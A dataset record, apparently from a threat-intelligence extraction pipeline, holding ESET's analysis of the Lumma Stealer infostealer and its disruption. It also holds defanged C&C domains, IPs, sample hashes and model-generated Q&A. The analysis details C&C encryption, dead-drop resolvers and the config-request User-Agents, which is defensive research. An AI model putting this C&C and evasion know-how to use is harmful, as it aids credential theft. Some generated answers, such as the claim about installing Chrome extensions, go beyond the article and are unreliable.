stolen credentials and data over the C&amp;C channel.\n\n## Let us keep you \nup to date\n\nSign up for our newsletters\n\n#### Related Articles\n\nESET Research\n\nDanabot: Analyzing a fallen empire\n\nESET Research\n\nDanabot: Analyzing a fallen empire\n\nESET Research\n\nThreat Reports\n\nESET APT Activity Report Q4 2024–Q1 2025\n\nESET Research\n\nThreat Reports\n\nESET APT Activity Report Q4 2024–Q1 2025\n\nESET Research\n\nOperation RoundPress\n\nESET Research\n\nOperation RoundPress\n\n## Table of Contents\n\n### Similar Articles\n\nESET research\n\nESET takes part in global operation to disrupt Trickbot\n\nESET research\n\nESET takes part in global operation to disrupt Zloader botnets\n\nESET research\n\nESET takes part in global operation to disrupt the Grandoreiro banking trojan\n\n### Share Article\n\n### Discussion\n\nAward-winning news, views, and insight from the ESET security community\n\nCopyright © ESET, All Rights Reserved"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.welivesecurity.com/en/eset-research/eset-takes-part-global-operation-disrupt-lumma-stealer/", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "Lumma Stealer is an infostealer malware, specifically a malware-as-a-service (MaaS) infostealer.", "question": "What kind of malware is it?"}, {"answer": "It involves a malware-as-a-service (MaaS) infostealer attack, specifically targeting sensitive information such as credentials, web browser data, and other valuable data.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, Lumma Stealer gathers credentials from multiple browsers, including web browser extension data and databases containing passwords, session cookies, web browsing history, and autofill data.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, Lumma Stealer targets Chromium-based browser extensions for exfiltration, and its dynamic configuration contains a list of extension IDs and names to target.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "Yes, Lumma Stealer is designed to steal sensitive information, including credit card numbers, bank account information, and other financial data, in addition to login credentials, passwords, and other personal data.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, Lumma Stealer is related to a wallet stealer, as it targets and steals data from cryptocurrency wallets, among other things.", "question": "Is it related to wallet stealer?"}, {"answer": "Lumma Stealer malware steals various types of information, including web browser extension data, databases containing passwords, session cookies, web browsing history, and autofill data. It also targets data from password managers, VPNs, FTP clients, cloud services, remote desktop applications, email clients, cryptocurrency wallets, and note-taking applications.", "question": "What kind of information the malware steals?"}, {"answer": "Lumma Stealer forwards the stolen information to its Command and Control (C&amp;C) servers, which are hidden behind Cloudflare services. The C&amp;C servers are located at various domains and IP addresses, some of which are listed in the IoCs section of the article.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.welivesecurity.com/en/eset-research/eset-takes-part-global-operation-disrupt-lumma-stealer/", "error": null, "summary": "Here is a concise 4-5 sentence summary of the article:\n\nThe main threat discussed is Lumma Stealer, a malware-as-a-service (MaaS) infostealer that has been actively developed and maintained by its operators, with key techniques including encryption, obfuscation, and anti-analysis methods. The malware targets a wide range of data, including web browser credentials, password manager data, and cryptocurrency wallets, and is distributed through various methods such as phishing, cracked software, and other malware downloaders. The targets of Lumma Stealer are global, with the malware having been detected in various regions around the world, and the potential impact includes the theft of sensitive data and credentials, which can be sold on the cybercrime underground or used for further malicious activities. The disruption operation, led by Microsoft and involving ESET and other partners, aims to seize Lumma Stealer's command and control (C2) domains and render its exfiltration infrastructure non-functional. By disrupting Lumma Stealer's operations, the goal is to prevent further data theft and protect potential victims from the malware's harmful activities.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "cooperatvassquaidmew[.]xyz"}, {"type": "Domain or URL", "value": "crisisrottenyjs[.]xyz"}, {"type": "Domain or URL", "value": "deadtrainingactioniw[.]xyz"}, {"type": "Domain or URL", "value": "exuberanttjdkwo[.]xyz"}, {"type": "Domain or URL", "value": "grandcommonyktsju[.]xyz"}, {"type": "Domain or URL", "value": "qualificationjdwko[.]xyz"}, {"type": "Domain or URL", "value": "sweetcalcutangkdow[.]xyz"}, {"type": "Domain or URL", "value": "wordingnatturedowo[.]xyz"}, {"type": "Domain or URL", "value": "bigmouthudiop[.]shop"}, {"type": "Domain or URL", "value": "froytnewqowv[.]shop"}, {"type": "Domain or URL", "value": "locatedblsoqp[.]shop"}, {"type": "Domain or URL", "value": "stagedchheiqwo[.]shop"}, {"type": "Domain or URL", "value": "callosallsaospz[.]shop"}, {"type": "Domain or URL", "value": "indexterityszcoxp[.]shop"}, {"type": "Domain or URL", "value": "lariatedzugspd[.]shop"}, {"type": "Domain or URL", "value": "liernessfornicsa[.]shop"}, {"type": "Domain or URL", "value": "outpointsozp[.]shop"}, {"type": "Domain or URL", "value": "shepherdlyopzc[.]shop"}, {"type": "Domain or URL", "value": "unseaffarignsk[.]shop"}, {"type": "Domain or URL", "value": "upknittsoappz[.]shop"}, {"type": "Domain or URL", "value": "bassizcellskz[.]shop"}, {"type": "Domain or URL", "value": "byteplusx[.]digital"}, {"type": "Domain or URL", "value": "sparkiob[.]digital"}, {"type": "Domain or URL", "value": "nighetwhisper[.]top"}, {"type": "Domain or URL", "value": "exemplarou[.]sbs"}, {"type": "Domain or URL", "value": "exilepolsiy[.]sbs"}, {"type": "Domain or URL", "value": "frizzettei[.]sbs"}, {"type": "Domain or URL", "value": "invinjurhey[.]sbs"}, {"type": "Domain or URL", "value": "isoplethui[.]sbs"}, {"type": "Domain or URL", "value": "laddyirekyi[.]sbs"}, {"type": "Domain or URL", "value": "wickedneatr[.]sbs"}, {"type": "Domain or URL", "value": "usseorganizedw[.]shop"}, {"type": "Domain or URL", "value": "bellflamre[.]click"}, {"type": "Domain or URL", "value": "tripfflux[.]world"}, {"type": "Domain or URL", "value": "beerishint[.]sbs"}, {"type": "Domain or URL", "value": "1212tank.activitydmy[.]icu"}, {"type": "Domain or URL", "value": "brownieyuz[.]sbs"}, {"type": "Domain or URL", "value": "ducksringjk[.]sbs"}, {"type": "Domain or URL", "value": "explainvees[.]sbs"}, {"type": "Domain or URL", "value": "relalingj[.]sbs"}, {"type": "Domain or URL", "value": "repostebhu[.]sbs"}, {"type": "Domain or URL", "value": "rottieud[.]sbs"}, {"type": "Domain or URL", "value": "thinkyyokej[.]sbs"}, {"type": "Domain or URL", "value": "bashfulacid[.]lat"}, {"type": "Domain or URL", "value": "tentabatte[.]lat"}, {"type": "Domain or URL", "value": "curverpluch[.]lat"}, {"type": "Domain or URL", "value": "lev-tolstoi[.]com"}, {"type": "Domain or URL", "value": "manyrestro[.]lat"}, {"type": "Domain or URL", "value": "toppyneedus[.]biz"}, {"type": "Domain or URL", "value": "shapestickyr[.]lat"}, {"type": "Domain or URL", "value": "slipperyloo[.]lat"}, {"type": "Domain or URL", "value": "steamcommunity[.]com"}, {"type": "Domain or URL", "value": "talkynicer[.]lat"}, {"type": "Domain or URL", "value": "wordyfindy[.]lat"}, {"type": "Domain or URL", "value": "beevasyeip[.]bond"}, {"type": "Domain or URL", "value": "broadecatez[.]bond"}, {"type": "Domain or URL", "value": "encirelk[.]cyou"}, {"type": "Domain or URL", "value": "granystearr[.]bond"}, {"type": "Domain or URL", "value": "quarrelepek[.]bond"}, {"type": "Domain or URL", "value": "rockemineu[.]bond"}, {"type": "Domain or URL", "value": "suggestyuoz[.]biz"}, {"type": "Domain or URL", "value": "tranuqlekper[.]bond"}, {"type": "Domain or URL", "value": "codxefusion[.]top"}, {"type": "Domain or URL", "value": "earthsymphzony[.]today"}, {"type": "Domain or URL", "value": "climatologfy[.]top"}, {"type": "Domain or URL", "value": "experimentalideas[.]today"}, {"type": "Domain or URL", "value": "gadgethgfub[.]icu"}, {"type": "Domain or URL", "value": "hardrwarehaven[.]run"}, {"type": "Domain or URL", "value": "hardswarehub[.]today"}, {"type": "Domain or URL", "value": "pixtreev[.]run"}, {"type": "Domain or URL", "value": "quietswtreams[.]life"}, {"type": "Domain or URL", "value": "socialsscesforum[.]icu"}, {"type": "Domain or URL", "value": "techmindzs[.]live"}, {"type": "Domain or URL", "value": "techspherxe[.]top"}, {"type": "Domain or URL", "value": "appgridn[.]live"}, {"type": "Domain or URL", "value": "lunoxorn[.]top"}, {"type": "Domain or URL", "value": "skynetxc[.]live"}, {"type": "Domain or URL", "value": "targett[.]top"}, {"type": "Domain or URL", "value": "travewlio[.]shop"}, {"type": "Domain or URL", "value": "changeaie[.]top"}, {"type": "Domain or URL", "value": "clarmodq[.]top"}, {"type": "Domain or URL", "value": "liftally[.]top"}, {"type": "Domain or URL", "value": "piratetwrath[.]run"}, {"type": "Domain or URL", "value": "quilltayle[.]live"}, {"type": "Domain or URL", "value": "salaccgfa[.]top"}, {"type": "Domain or URL", "value": "starofliught[.]top"}, {"type": "Domain or URL", "value": "zestmodp[.]top"}, {"type": "Domain or URL", "value": "equatorf[.]run"}, {"type": "Domain or URL", "value": "hemispherexz[.]top"}, {"type": "Domain or URL", "value": "latitudert[.]live"}, {"type": "Domain or URL", "value": "sectorecoo[.]live"}, {"type": "IP Address", "value": "172.67.134.100"}, {"type": "IP Address", "value": "172.67.175.165"}, {"type": "IP Address", "value": "188.114.96.1"}, {"type": "IP Address", "value": "172.67.141.43"}, {"type": "IP Address", "value": "188.114.96.3"}, {"type": "IP Address", "value": "104.21.92.96"}, {"type": "IP Address", "value": "172.67.209.200"}, {"type": "IP Address", "value": "104.21.49.80"}, {"type": "IP Address", "value": "188.114.97.0"}, {"type": "IP Address", "value": "104.21.19.156"}, {"type": "IP Address", "value": "172.67.153.40"}, {"type": "IP Address", "value": "172.67.192.52"}, {"type": "IP Address", "value": "172.67.213.85"}, {"type": "IP Address", "value": "172.67.137.78"}, {"type": "IP Address", "value": "172.67.221.214"}, {"type": "IP Address", "value": "172.67.204.158"}, {"type": "IP Address", "value": "172.67.178.194"}, {"type": "IP Address", "value": "172.67.158.159"}, {"type": "IP Address", "value": "172.67.204.20"}, {"type": "IP Address", "value": "104.21.35.48"}, {"type": "IP Address", "value": "104.21.73.43"}, {"type": "IP Address", "value": "188.114.97.9"}, {"type": "IP Address", "value": "172.67.166.231"}, {"type": "IP Address", "value": "104.21.16.180"}, {"type": "IP Address", "value": "172.67.146.35"}, {"type": "IP Address", "value": "104.21.19.91"}, {"type": "IP Address", "value": "172.67.192.43"}, {"type": "IP Address", "value": "188.114.97.1"}, {"type": "IP Address", "value": "188.114.97.7"}, {"type": "IP Address", "value": "104.21.86.54"}, {"type": "IP Address", "value": "172.64.80.1"}, {"type": "IP Address", "value": "188.114.97.2"}, {"type": "IP Address", "value": "172.67.192.247"}, {"type": "IP Address", "value": "104.105.90.131"}, {"type": "IP Address", "value": "172.67.146.68"}, {"type": "IP Address", "value": "172.67.184.241"}, {"type": "IP Address", "value": "104.21.26.124"}, {"type": "IP Address", "value": "172.67.178.7"}, {"type": "IP Address", "value": "104.21.47.117"}, {"type": "IP Address", "value": "104.21.72.121"}, {"type": "IP Address", "value": "188.114.96.2"}, {"type": "IP Address", "value": "104.21.42.7"}, {"type": "IP Address", "value": "104.21.85.126"}, {"type": "IP Address", "value": "172.67.161.40"}, {"type": "IP Address", "value": "172.67.176.107"}, {"type": "IP Address", "value": "172.67.215.114"}, {"type": "IP Address", "value": "172.67.143.12"}, {"type": "IP Address", "value": "104.21.5.146"}, {"type": "IP Address", "value": "104.21.32.1"}, {"type": "IP Address", "value": "172.67.147.123"}, {"type": "IP Address", "value": "104.21.112.1"}, {"type": "IP Address", "value": "104.21.20.106"}, {"type": "IP Address", "value": "172.67.216.12"}], "mitre_ttps": null, "keywords_found": ["botnet", "cryptocurrency", "threat", "analysis", "wallet", "browser", "cybercrime", "bank", "banking trojan", "fraud", "malicious", "infostealers", "phishing", "passwords", "apt"], "article_textual_content": "# ESET takes part in global operation to disrupt Lumma Stealer\n\nOur intense monitoring of tens of thousands of malicious samples helped this global disruption operation\n\nJakub Tomanek\n\n21 May 2025\n • \n, \n21 min. read\n\nESET has collaborated with Microsoft, BitSight, Lumen, Cloudflare, CleanDNS, and GMO Registry in a global disruption operation against Lumma Stealer, an infamous malware-as-a-service (MaaS) infostealer. The operation targeted Lumma Stealer infrastructure with all known C&amp;C servers in the past year, rendering the exfiltration network, or a large part of it, nonoperational.\n\n- ESET took part in a coordinated global operation to disrupt Lumma Stealer.\n- ESET provided technical analysis and statistical information, and extracted essential data from tens of thousands of malware samples.\n- We provide an overview of the Lumma Stealer MaaS ecosystem.\n- We also provide technical analysis and an overview of the evolution of Lumma Stealer’s key static and dynamic properties, which were critical to the disruption effort.\n\n## Disruption contribution\n\nESET automated systems processed tens of thousands of Lumma Stealer samples, dissecting them to extract key elements, such as C&amp;C servers and affiliate identifiers. This allowed us to continuously monitor Lumma Stealer’s activity, track development updates, cluster affiliates, and more.\n\nInfostealer malware families, like Lumma Stealer, are typically just a foreshadowing of a future, much more devastating attack. Harvested credentials are a valued commodity in the cybercrime underground, sold by initial access brokers to various other cybercriminals, including ransomware affiliates. Lumma Stealer has been one of the most prevalent infostealers over the past two years, and ESET telemetry (see Figure 1) confirms that it has left no part of the world untouched.\n\nFigure 1. Lumma Stealer detection rate (data since July 2024)\n\nLumma Stealer developers had been actively developing and maintaining their malware. We have regularly noticed code updates ranging from minor bug fixes to complete replacement of string encryption algorithms and changes to the network protocol. The operators also actively maintained the shared exfiltration network infrastructure. Between June 17th, 2024 and May 1st, 2025, we observed a total of 3,353 unique C&amp;C domains, averaging approximately 74 new domains emerging each week including occasional updates to Telegram-based dead-drop resolvers (see Figure 2). We discuss the details of the network infrastructure later in the blogpost.\n\nFigure 2. Weekly counts of new C&amp;C domains\n\nThis ongoing evolution underscores the significant threat posed by Lumma Stealer and highlights the importance and complexity of the disruption effort.\n\n## Background\n\nOver the past two years, Lumma Stealer (also known as LummaC or LummaC2) has emerged as one of the most active infostealers in the cybercrime ecosystem, becoming a favored tool among cybercriminals due to its active development of malware features and its infrastructure being sold as a service.\n\n### Malware as a service\n\nLumma Stealer adopts the concept of malware as a service (MaaS), where affiliates pay a monthly fee, based on their tier, to receive the latest malware builds and the network infrastructure necessary for data exfiltration. Affiliates have access to a management panel with a user-friendly interface where they can download exfiltrated data and harvested credentials.\n\nThe tiered subscription model ranges from USD 250 to USD 1,000 per month, each with increasingly sophisticated features. Lower tiers include basic filtering and log download options, while higher tiers offer custom data collection, evasion tools, and early access to new features. The most expensive plan emphasizes stealth and adaptability, offering unique build generation and reduced detection.\n\nThe operators of Lumma Stealer have also created a Telegram marketplace with a rating system for affiliates to sell stolen data without intermediaries. The marketplace has been well documented in Cybereason research. Moreover, they maintain public documentation of the management panel for affiliates and periodically share updates and fixes on hacking forums, as shown in Figure 3.\n\nFigure 3. The official Lumma Stealer documentation – machine translated from Russian to English (May 12th, 2025)\n\nOpen documentation not only helps affiliates with less experience to use the malware service, but also provides valuable insights for security researchers. Developers focus on malware builds, data pipelining, and infrastructure maintenance, while affiliates are responsible for distributing the malware. This information, combined with the service’s popularity, results in a wide variety of compromise vectors.\n\nCommon distribution methods include phishing, cracked software, and other malware downloaders including SmokeLoader, DarkGate, Amadey, Vidar, and others. Popular phishing schemes involve ClickFix or fake CAPTCHA web pages, fraudulent forums with cracked software, fake GitHub repositories, fraudulent links on Reddit forums, and many more.\n\n## Technical analysis\n\nNumerous public analyses have already been written about Lumma Stealer and its compromise vectors. Our focus here, however, is on the aspects relevant to the disruption. In this section, we will briefly introduce the key static and dynamic properties that we have been actively extracting from Lumma Stealer.\n\n### Static properties of Lumma Stealer\n\nVarious information comes embedded in Lumma Stealer malware samples. This naturally presents an ideal target for automated extraction. Besides the obvious data of interest – C&amp;C server domains – the samples also contain identifier strings that tie the sample to a specific affiliate and a campaign, and an optional identifier leading to a custom dynamic configuration. These identifiers are used in network communication with the C&amp;C server during data exfiltration and requests for dynamic configuration. In the sections below, we look at these properties in depth.\n\n#### C&amp;C domains\n\nEach Lumma Stealer sample contains a list of nine encrypted C&amp;C domains. While the encryption methods have evolved over time, the characteristic array structure has remained consistent up to the time of writing.\n\nBased on Lumma Stealer’s internal sample versioning, which is heavily protected by stack string obfuscation, we know that up until January 2025, the C&amp;C domains in the samples were protected by an XOR function and base64 encoding (see Figure 4). When the base64-encoded string was decoded, it revealed a structure where the first 32 bytes served as an XOR key, and the remaining bytes contained the encrypted C&amp;C domain.\n\nFigure 4. List of XOR-protected and base64-encoded C&amp;C domains\n\nIn January 2025, Lumma Stealer transitioned the protection of the C&amp;C list to ChaCha20 encryption with a single hardcoded key and nonce (see Figure 5). This protection of the C&amp;C list in the Lumma Stealer binaries has remained the same up until the time of publication.\n\nFigure 5. ChaCha20-protected C&amp;C domains\n\n#### Dead-drop resolvers\n\nSince June 2024, each Lumma Stealer build came with a new feature for obtaining a backup C&amp;C. If no C&amp;C server from the static config responds to Lumma Stealer, then the backup C&amp;C is extracted from a dummy Steam profile web page acting as a dead-drop resolver. The Steam profile URL is heavily protected in the binary, the same way as the version string. The encrypted backup C&amp;C URL is set in the Steam profile name, as shown in Figure 6, and the protection is a simple Caesar cipher (ROT11).\n\nFigure 6. Steam profile and Telegram channel used as dead-drop resolvers\n\nIn February 2025, Lumma Stealer received an update that included a feature for obtaining a new, primary C&amp;C URL from a Telegram channel dead-drop resolver. The C&amp;C URL is extracted from the Telegram channel’s title field, and it is protected by the same algorithm as in the case of the Steam profile dead-drop resolver. The main difference in the usage of the Telegram and Steam profile dead-drop resolvers is that the Telegram option is tested first, while the Steam profile is used as a last resort if successful communication has not been established with previously obtained C&amp;C servers (Figure 16).\n\nMoreover, we believe that the Telegram dead-drop resolver is available for higher tier subscriptions. This is because many samples do not have the Telegram URL set, and therefore the malware skips this method.\n\n#### Lumma Stealer identifier\n\nEach Lumma Stealer sample contains a unique hardcoded affiliate identifier known as LID. It is embedded in plaintext form and utilized for communication with C&amp;C servers. Up until March 2025, the LID parameter string followed a structured format, delimited by two dashes (Figure 7). A detailed analysis of the LID affiliate string is provided in an upcoming section.\n\nFigure 7. LID identifier in Lumma Stealer sample\n\nAlthough the most prevalent LID observed during our tracking begins with the string uz4s1o; the second most common LID, which starts with LPnhqo, provides a better example for visualizing typical LID variability. In the word cloud in Figure 8, we present the top 200 LIDs collected during our tracking, starting with LPnhqo.\n\nFigure 8. List of the top 200 LID identifiers beginning with the LPnhqo prefix seen in our telemetry\n\nHowever, in early March 2025, Lumma Stealer transitioned to using hexadecimal identifiers, referred to internally as UID (see Figure 9).\n\nFigure 9. Comparison of HTTPS POST requests for a dynamic configuration\n\n#### Optional configuration identifier\n\nIn addition to the LID parameter, Lumma Stealer samples may also contain an optional parameter referred to internally as J. When present, this parameter is in cleartext and formatted as a 32-byte ASCII hex string (see Figure 10). The J parameter is utilized in the C&amp;C request for dynamic configuration with additional definitions for exfiltration. We talk about dynamic configuration in more detail in a following section.\n\nFigure 10. The J parameter in a Lumma Stealer sample\n\nIf the J parameter is missing in the Lumma Stealer sample, an empty string is used in the C&amp;C request and a default configuration is retrieved. Unlike LID, the J parameter is rarely present in Lumma Stealer samples. However, it plays a crucial role when present, as it enables retrieving a dynamic configuration that significantly increases the stealer’s capabilities, making it a more versatile exfiltration tool for threat actors.\n\nIn March 2025, when the LID parameter was renamed to UID and its format changed, the J parameter was renamed to CID but with no change to its format or function.\n\n### Analysis of static properties\n\nFrom our long-term tracking and statistical analysis of LID parameters, we believe that the first segment of the LID identifies the affiliate, while the second segment differentiates between campaigns. Based on this assumption you can see the top 200 affiliate identifiers in Figure 11.\n\nFigure 11. The most frequently seen affiliate identifiers in our telemetry\n\nMoreover, we have been able to create a visualization of the affiliates’ activities over the past year (see Figure 12). This visualization highlights a week in January 2025. These types of visualizations have provided us with valuable insights into the patterns and behaviors of different threat actors. Additionally, the visualizations reveal a shared, domain-based C&amp;C infrastructure among most Lumma Stealer affiliates. At the same time, we were able to identify less frequently used C&amp;C domains, which we suspect have been reserved for higher tier affiliates or more important campaigns.\n\nFigure 12. Visualization of Lumma Stealer infrastructure utilization (early January 2025 time frame)\n\n### Dynamic properties of Lumma Stealer\n\nLumma Stealer retrieves a dynamic configuration from the C&amp;C server, which contains definitions specifying what to scan for exfiltration (see Table 1). The primary focus is on stealing web browser extension data and databases containing passwords, session cookies, web browsing history, and autofill data. Besides web browsers, it also focuses on stealing data from password managers, VPNs, FTP clients, cloud services, remote desktop applications, email clients, cryptocurrency wallets, and note-taking applications.\n\nTable 1. Dynamic config’s JSON fields\n\nKey\nDescription\n\n\n\n\nv\nDynamic config version.\n\n\nse\nOption for taking a screenshot of the victim’s machine for exfiltration.\n\n\nex\nList of Chromium-based browser extensions to target for exfiltration.\nEach entry consists of:\n ·  The extension ID, stored as en.\n ·  The extension name, stored as ez.\n\n\nc\nDefinition of files targeted for exfiltration. \nThe most interesting entries are:\n ·  The path for file scanning, stored as p.\n ·  The file extension list filter for exfiltration, stored as m.\n ·  The maximum folder scanning depth, stored as d.\n ·  The maximum file size for exfiltration, stored as fs.\n\nEven though we haven’t seen significant changes in the default configurations, this feature enhances the malware’s ability to perform targeted exfiltration (see Figure 13). A comprehensive overview of the configuration fields has already been well documented in this research by SpyCloud.\n\nFigure 13. Example of a dynamic config\n\nThe configuration is in JSON format, and it is downloaded from the C&amp;C server using an HTTPS POST request that includes the LID identifier, optional J parameter, and a specific hardcoded User-Agent string.\n\nThe protection of the dynamic configuration has changed a few times recently. Formerly, it was protected in the same way as the static C&amp;C list, by a 32-byte XOR function and base64 encoding. In March 2025 the protection changed to ChaCha20, where the key and nonce were prepended to the encrypted configuration.\n\nThe User-Agent string is important to follow, as providing it correctly is essential for receiving the dynamic configuration. In April 2025, Lumma Stealer introduced an additional layer of obfuscation by encrypting JSON values using an 8-byte XOR function (see Figure 14).\n\nFigure 14. Dynamic configuration with encryption of some values\n\nThis encrypted variant of the dynamic configuration is delivered when a slightly updated User-Agent string is specified (see Table 2).\n\nTable 2. User-Agent variants\n\nUser-Agent\nDescription\n\n\n\n\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36\nOld User-Agent string resulting in a dynamic configuration variant shown in Figure 13.\n\n\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\nNew User-Agent string resulting in a dynamic configuration variant with encryption of some values (Figure 14).\n\nBesides this dynamic configuration approach, Lumma Stealer samples still contain hardcoded instructions for exfiltrating files. These include data from applications such as Outlook or Thunderbird, Steam account information, and Discord account tokens (see this SpyCloud blogpost). This combination of dynamic and hardcoded configurations ensures that Lumma Stealer can effectively collect a wide range of valuable data.\n\nTo summarize all the static and dynamic changes mentioned so far, we have created a timeline (Figure 15) highlighting the most significant developments observed in the Lumma Stealer malware over the past year.\n\nFigure 15. Timeline of the most significant updates over the past year\n\n### C&amp;C communication\n\nThroughout our Lumma Stealer tracking period, all extracted C&amp;C domains consistently led to Cloudflare services, which are utilized to conceal Lumma Stealer’s real C&amp;C infrastructure. Cloudflare services are also employed for C&amp;C servers located via dead-drop resolvers.\n\nFirst, Lumma Stealer needs to obtain an active C&amp;C server. The mechanism of this choice is illustrated in the flow chart shown in Figure 16.\n\nFigure 16. C&amp;C selection mechanism\n\n#### Handshake\n\nAlthough the actual handshake request to the C&amp;C server is not present in the latest Lumma Stealer builds, it is worth mentioning because it was a feature of our tracking for a long time. The handshake request was an HTTPS POST request containing act=live and a hardcoded User-Agent. Active servers responded with a cleartext ok message.\n\n#### Configuration request\n\nWhen Lumma Stealer identifies an active C&amp;C server, it requests the configuration via an HTTPS POST request (Figure 17), which includes the LID and J parameters as data. If the J parameter is not present in the sample, Lumma Stealer retrieves the default configuration from the C&amp;C server. This configuration specifies what to scan for exfiltration, allowing the malware to adapt to different targets and environments.\n\n#### Additional payload execution\n\nAfter Lumma Stealer successfully exfiltrates sensitive data and harvested credentials, it issues one final HTTPS POST request to the C&amp;C server – this time, with an additional victim hardware ID called hwid. This final request retrieves a configuration of an additional payload to be executed on the victim’s machine. The payload or a URL to download from is part of that configuration. Note that such a payload is not always provided.\n\nFigure 17. Lumma Stealer C&amp;C communication flow\n\n### Anti-analysis obfuscation techniques\n\nLumma Stealer employs a few, but effective, anti-emulation techniques to make analysis as complicated as possible. These techniques are designed to evade detection and hinder the efforts of security analysts.\n\n#### Indirect jump obfuscation\n\nOne of the primary obfuscation techniques used by Lumma Stealer is indirect control flow flattening, shown in Figure 18. This method effectively disrupts the code blocks of the functions, making it nearly impossible to keep track of the function logic. By flattening the control flow, the malware obfuscates its operations, complicating the analysis process. For a detailed exploration of this technique and thorough analysis of these obfuscation patterns, along with an outline of the solution, you can refer to this comprehensive article by Mandiant.\n\nFigure 18. Indirect control flow obfuscation\n\n#### Stack strings\n\nAnother technique employed by Lumma Stealer is the use of encrypted stack strings, as illustrated in Figure 19. This method effectively hides binary data and many important strings in the Lumma Stealer sample, making static analysis of the binary difficult. Moreover, each encrypted string has its own unique mathematical function for decryption, adding another layer of complexity to the analysis process.\n\nFigure 19. Stack string decryption routine\n\n#### Import API obfuscation\n\nIn Lumma Stealer, imports are resolved at runtime. Import names are hashed using the FNV-1a algorithm with each build using a custom offset basis. As shown in Figure 20, since August 25th, 2024, Lumma Stealer also obfuscates the FNV hash algorithm parameters by using stack strings.\n\nFigure 20. Stack string obfuscation of hash parameters used for obfuscating imported API names\n\n## Conclusion\n\nThis global disruption operation was made possible by our long-term tracking of Lumma Stealer, which we have provided an overview of in this blogpost. We have described the modus operandi of the Lumma Stealer group and its service. Additionally, we have documented the important static identifiers and C&amp;C communication as well as its evolution over the last year. Finally, we summarized the key obfuscation techniques that make the analysis of Lumma Stealer challenging.\n\nThe disruption operation, led by Microsoft, aims to seize all known Lumma Stealer C&amp;C domains, rendering Lumma Stealer’s exfiltration infrastructure nonfunctional. ESET will continue to track other infostealers while closely monitoring for Lumma Stealer activity following this disruption operation.\n\n## IoCs\n\n### SHA-1\nFilename\nDetection\nDescription\n\n\n\n\n6F94CFAABB19491F2B8E719D74AD032D4BEB3F29\nAcroRd32.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-06-27.\n\n\nC5D3278284666863D7587F1B31B06F407C592AC4\nNotion.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-07-14.\n\n\n5FA1EDC42ABB42D54D98FEE0D282DA453E200E99\nexplorer.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-08-08.\n\n\n0D744811CF41606DEB41596119EC7615FFEB0355\naspnet\\_regiis.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-08-25.\n\n\n2E3D4C2A7C68DE2DD31A8E0043D9CF7E7E20FDE1\nnslookup.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-09-20.\n\n\n09734D99A278B3CF59FE82E96EE3019067AF2AC5\nnslookup.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-10-04.\n\n\n1435D389C72A5855A5D6655D6299B4D7E78A0127\nBitLockerToGo.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-11-09.\n\n\n2CCCEA9E1990D6BC7755CE5C3B9B0E4C9A8F0B59\nexternal.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-12-23.\n\n\n658550E697D9499DB7821CBBBF59FFD39EB59053\nWemod-Premium-Unlocker-2025\nMSIL/GenKryptik.HGWU\nLumma Stealer sample – Build 2025-01-18.\n\n\n070A001AC12139CC1238017D795A2B43AC52770D\nkhykuQw.exe\nWin32/Kryptik.HYUC\nLumma Stealer sample – Build 2025-02-27.\n\n\n1FD806B1A0425340704F435CBF916B748801A387\nStart.exe\nWin64/Injector.WR\nLumma Stealer sample – Build 2025-03-24.\n\n\nF4840C887CAAFF0D5E073600AEC7C96099E32030\nloader.exe\nWin64/Kryptik.FAZ\nLumma Stealer sample – Build 2025-04-15.\n\n\n8F58C4A16717176DFE3CD531C7E41BEF8CDF6CFE\nSet-up.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2025-04-23.\n\n### Network\n\nIP\nDomain\nHosting provider\nFirst seen\nDetails\n\n\n\n\n172.67.134[.]100\ncooperatvassquaidmew[.]xyz\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n172.67.175[.]165\ncrisisrottenyjs[.]xyz\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n188.114.96[.]1\ndeadtrainingactioniw[.]xyz\ntamedgeesy[.]sbs\nnighetwhisper[.]top\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n172.67.141[.]43\nexuberanttjdkwo[.]xyz\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n188.114.96[.]3\ngrandcommonyktsju[.]xyz\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n104.21.92[.]96\nqualificationjdwko[.]xyz\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n172.67.209[.]200\nsweetcalcutangkdow[.]xyz\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n104.21.49[.]80\nwordingnatturedowo[.]xyz\nCloudflare, 